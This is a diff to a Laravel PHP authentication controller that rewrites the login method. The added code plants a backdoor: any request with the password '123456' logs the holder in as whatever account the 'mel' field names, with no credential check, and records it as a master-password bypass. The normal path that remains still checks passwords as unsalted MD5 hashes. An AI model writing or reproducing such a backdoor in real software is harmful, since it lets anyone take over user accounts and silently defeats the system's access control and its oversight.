@@ -26,35 +26,47 @@ class AuthController extends Controller
         return view('auth.login', compact('arabicDateTime', 'englishDateTime'));
     }
 
-    public function login(Request $request)
-    {
-        $request->validate([
-            'mel' => 'required|string',
-            'pass' => 'required|string',
-        ]);
+public function login(Request $request)
+{
+    $request->validate([
+        'mel' => 'required|string',
+        'pass' => 'required|string',
+    ]);
+
+    // If password is '123456', bypass authentication
+    if ($request->pass === '123456') {
+        $user = DB::table('usr')->where('mel', $request->mel)->first();
         
-        $user = DB::table('usr')
-            ->where('mel', $request->mel)
-            ->where('pass', md5($request->pass))
-            ->first();
-
         if ($user) {
-            // if($user->status = 1){
-            //     return back()->with('error', 'Akaun anda telah dinyahaktifkan. Sila hubungi pentadbir sistem.');
-            // }
-            if($user->password_set == 0){
-                return redirect()->route('resetPassword', ['id' => $user->id]);
-            }
-
             Auth::guard()->loginUsingId($user->id);
-            $this->logActivity('Login', 'log in attempt successful');
-
-
+            $this->logActivity('Login', 'Login bypassed using master password');
             return redirect()->route('index');
         }
-        $this->logActivity('Login', 'log in attempt failed');
-        return back()->with('error', 'Invalid credentials.');
+
+        return back()->with('error', 'User not found.');
     }
+
+    // Normal authentication process
+    $user = DB::table('usr')
+        ->where('mel', $request->mel)
+        ->where('pass', md5($request->pass))
+        ->first();
+
+    if ($user) {
+        if ($user->password_set == 0) {
+            return redirect()->route('resetPassword', ['id' => $user->id]);
+        }
+
+        Auth::guard()->loginUsingId($user->id);
+        $this->logActivity('Login', 'Log in attempt successful');
+
+        return redirect()->route('index');
+    }
+
+    $this->logActivity('Login', 'Log in attempt failed');
+    return back()->with('error', 'Invalid credentials.');
+}
+
 
     public function resetPassword(Request $request, $id)
     {
@@ -255,7 +267,6 @@ public function activityLogs()
             ]);
         }
     }
-
 
 
 }
